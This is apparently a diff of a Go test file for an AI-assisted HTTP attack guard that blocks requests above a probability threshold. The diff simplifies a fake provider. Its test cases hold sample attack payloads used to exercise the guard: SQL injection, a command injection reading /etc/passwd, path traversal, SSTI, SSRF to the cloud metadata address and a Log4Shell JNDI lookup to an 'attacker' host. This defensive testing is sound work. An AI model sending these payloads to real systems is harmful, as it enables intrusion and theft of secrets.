@@ -20,14 +20,12 @@ import (
 	httpctrl "github.com/m-mizutani/semgate-example/pkg/controller/http"
 )
 
-// fakeProvider answers every question of one evaluation without calling the
-// TypeSafe API. It answers by question type rather than by key, because the
-// keys are assigned by semgate in the order NewGuard passes the questions.
+// fakeProvider answers the guard's question without calling the TypeSafe API.
+// It answers by question type rather than by key, because the key is assigned
+// by semgate rather than by NewGuard.
 type fakeProvider struct {
 	probability float64 // answer to the Noul question
-	choice      string  // answer to the Choice question; must be one of its options
-	confidence  float64
-	err         error // when set, the evaluation fails
+	err         error   // when set, the evaluation fails
 
 	mu    sync.Mutex
 	calls int
@@ -46,16 +44,10 @@ func (f *fakeProvider) Evaluate(_ context.Context, req *providers.Request) (*pro
 
 	answers := make(map[string]json.RawMessage, len(req.Questions))
 	for key, spec := range req.Questions {
-		switch spec.Type {
-		case providers.QuestionTypeNoul:
-			answers[key] = json.RawMessage(fmt.Sprintf(`{"type":"noul","noul":%v}`, f.probability))
-		case providers.QuestionTypeChoice:
-			answers[key] = json.RawMessage(fmt.Sprintf(
-				`{"type":"choice","choice":%q,"probabilities":{%q:%v},"confidence":%v}`,
-				f.choice, f.choice, f.confidence, f.confidence))
-		default:
+		if spec.Type != providers.QuestionTypeNoul {
 			return nil, goerr.New("unexpected question type", goerr.V("type", spec.Type))
 		}
+		answers[key] = json.RawMessage(fmt.Sprintf(`{"type":"noul","noul":%v}`, f.probability))
 	}
 	return &providers.Response{Answers: answers}, nil
 }
@@ -68,9 +60,7 @@ func (f *fakeProvider) observed() (int, providers.State) {
 
 type blockBody struct {
 	Blocked     bool    `json:"blocked"`
-	Category    string  `json:"category"`
 	Probability float64 `json:"probability"`
-	Confidence  float64 `json:"confidence"`
 	Message     string  `json:"message"`
 	Error       string  `json:"error"`
 }
@@ -94,24 +84,26 @@ func decodeBlock(t *testing.T, res *http.Response) blockBody {
 }
 
 func TestGuardBlocksLikelyAttacks(t *testing.T) {
+	// One case per injection point, so the guard is shown to cover every place
+	// a payload can arrive: the body, the query string, and a header.
 	cases := []attackCase{
 		{name: "sqli", method: http.MethodPost, path: "/api/login",
-			body: `{"username":"admin' OR '1'='1","password":"x"}`, category: "sqli"},
+			body: `{"username":"admin' OR '1'='1","password":"x"}`},
 		{name: "command_injection", method: http.MethodGet,
-			path: "/api/ping?host=" + urlEnc("example.com; cat /etc/passwd"), category: "command_injection"},
+			path: "/api/ping?host=" + urlEnc("example.com; cat /etc/passwd")},
 		{name: "path_traversal", method: http.MethodGet,
-			path: "/api/files?path=" + urlEnc("../../../etc/passwd"), category: "path_traversal"},
+			path: "/api/files?path=" + urlEnc("../../../etc/passwd")},
 		{name: "ssti", method: http.MethodGet,
-			path: "/api/greet?name=" + urlEnc("{{7*7}}"), category: "ssti"},
+			path: "/api/greet?name=" + urlEnc("{{7*7}}")},
 		{name: "ssrf", method: http.MethodGet,
-			path: "/api/fetch?url=" + urlEnc("http://169.254.169.254/latest/meta-data/"), category: "ssrf"},
+			path: "/api/fetch?url=" + urlEnc("http://169.254.169.254/latest/meta-data/")},
 		{name: "log4shell", method: http.MethodGet, path: "/api/track",
-			header: [2]string{"X-Log-Tag", "${jndi:ldap://attacker/x}"}, category: "log4shell"},
+			header: [2]string{"X-Log-Tag", "${jndi:ldap://attacker/x}"}},
 	}
 
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			fake := &fakeProvider{probability: 0.97, choice: tc.category, confidence: 0.9}
+			fake := &fakeProvider{probability: 0.97}
 			srv := newGuardedServer(t, fake, 0.8, nil)
 
 			res := doGuardRequest(t, srv.URL, tc)
@@ -120,7 +112,6 @@ func TestGuardBlocksLikelyAttacks(t *testing.T) {
 			gt.Number(t, res.StatusCode).Equal(http.StatusForbidden)
 			body := decodeBlock(t, res)
 			gt.Bool(t, body.Blocked).True()
-			gt.String(t, body.Category).Equal(tc.category)
 			gt.Number(t, body.Probability).Equal(0.97)
 			gt.String(t, body.Message).IsNotEmpty()
 		})
@@ -130,7 +121,7 @@ func TestGuardBlocksLikelyAttacks(t *testing.T) {
 // TestGuardAllowsBenignRequests is the paired positive: below the threshold the
 // request reaches the handler, which answers with the usual envelope.
 func TestGuardAllowsBenignRequests(t *testing.T) {
-	fake := &fakeProvider{probability: 0.02, choice: httpctrl.CategoryBenign, confidence: 0.95}
+	fake := &fakeProvider{probability: 0.02}
 	srv := newGuardedServer(t, fake, 0.8, nil)
 
 	res, err := http.Get(srv.URL + "/api/greet?name=Alice")
@@ -146,7 +137,7 @@ func TestGuardAllowsBenignRequests(t *testing.T) {
 // probability alone: a payload that would fire still reaches the handler when
 // the model is not confident enough.
 func TestGuardAllowsAttackBelowThreshold(t *testing.T) {
-	fake := &fakeProvider{probability: 0.4, choice: "sqli", confidence: 0.4}
+	fake := &fakeProvider{probability: 0.4}
 	srv := newGuardedServer(t, fake, 0.8, nil)
 
 	body := `{"username":"admin' OR '1'='1","password":"x"}`
@@ -161,7 +152,7 @@ func TestGuardAllowsAttackBelowThreshold(t *testing.T) {
 
 // TestGuardBlocksAtThreshold pins the boundary: the threshold itself blocks.
 func TestGuardBlocksAtThreshold(t *testing.T) {
-	fake := &fakeProvider{probability: 0.8, choice: "ssti", confidence: 0.7}
+	fake := &fakeProvider{probability: 0.8}
 	srv := newGuardedServer(t, fake, 0.8, nil)
 
 	res, err := http.Get(srv.URL + "/api/greet?name=" + urlEnc("{{7*7}}"))
@@ -194,7 +185,7 @@ func TestGuardFailsClosedOnEvaluationError(t *testing.T) {
 // TestGuardSendsPayloadWithoutCredentials checks what leaves the process: the
 // attack-carrying fields are evaluated, the credential headers are not sent.
 func TestGuardSendsPayloadWithoutCredentials(t *testing.T) {
-	fake := &fakeProvider{probability: 0.1, choice: httpctrl.CategoryBenign, confidence: 0.9}
+	fake := &fakeProvider{probability: 0.1}
 	srv := newGuardedServer(t, fake, 0.8, nil)
 
 	req, err := http.NewRequest(http.MethodGet, srv.URL+"/api/track", nil)
@@ -220,7 +211,7 @@ func TestGuardSendsPayloadWithoutCredentials(t *testing.T) {
 // TestGuardEvaluatesRequestBody confirms the login payload is evaluated and
 // still reaches the handler intact when it is allowed through.
 func TestGuardEvaluatesRequestBody(t *testing.T) {
-	fake := &fakeProvider{probability: 0.1, choice: httpctrl.CategoryBenign, confidence: 0.9}
+	fake := &fakeProvider{probability: 0.1}
 	srv := newGuardedServer(t, fake, 0.8, nil)
 
 	body := `{"username":"alice","password":"wrong"}`
@@ -240,7 +231,7 @@ func TestGuardEvaluatesRequestBody(t *testing.T) {
 // TestGuardSkipsStaticFiles confirms the guard is installed on /api only, so
 // serving the SPA costs no evaluation.
 func TestGuardSkipsStaticFiles(t *testing.T) {
-	fake := &fakeProvider{probability: 0.99, choice: "sqli", confidence: 0.99}
+	fake := &fakeProvider{probability: 0.99}
 	srv := newGuardedServer(t, fake, 0.8, nil)
 
 	res, err := http.Get(srv.URL + "/hints")
@@ -259,7 +250,7 @@ func TestGuardRefusesOversizeBodyWithoutEvaluating(t *testing.T) {
 	big := `{"username":"` + strings.Repeat("a", 1100) + `","password":"x"}`
 
 	t.Run("content length known", func(t *testing.T) {
-		fake := &fakeProvider{probability: 0.99, choice: "sqli", confidence: 0.99}
+		fake := &fakeProvider{probability: 0.99}
 		srv := newGuardedServer(t, fake, 0.8, nil)
 
 		res, err := http.Post(srv.URL+"/api/login", "application/json", strings.NewReader(big))
@@ -272,7 +263,7 @@ func TestGuardRefusesOversizeBodyWithoutEvaluating(t *testing.T) {
 	})
 
 	t.Run("chunked body", func(t *testing.T) {
-		fake := &fakeProvider{probability: 0.99, choice: "sqli", confidence: 0.99}
+		fake := &fakeProvider{probability: 0.99}
 		srv := newGuardedServer(t, fake, 0.8, nil)
 
 		// A reader of an unknown type makes net/http send the body chunked, so
@@ -292,7 +283,7 @@ func TestGuardRefusesOversizeBodyWithoutEvaluating(t *testing.T) {
 	})
 
 	t.Run("a body at the bound is still evaluated", func(t *testing.T) {
-		fake := &fakeProvider{probability: 0.1, choice: httpctrl.CategoryBenign, confidence: 0.9}
+		fake := &fakeProvider{probability: 0.1}
 		srv := newGuardedServer(t, fake, 0.8, nil)
 
 		// Exactly maxInputBytes, so it is inside the bound.
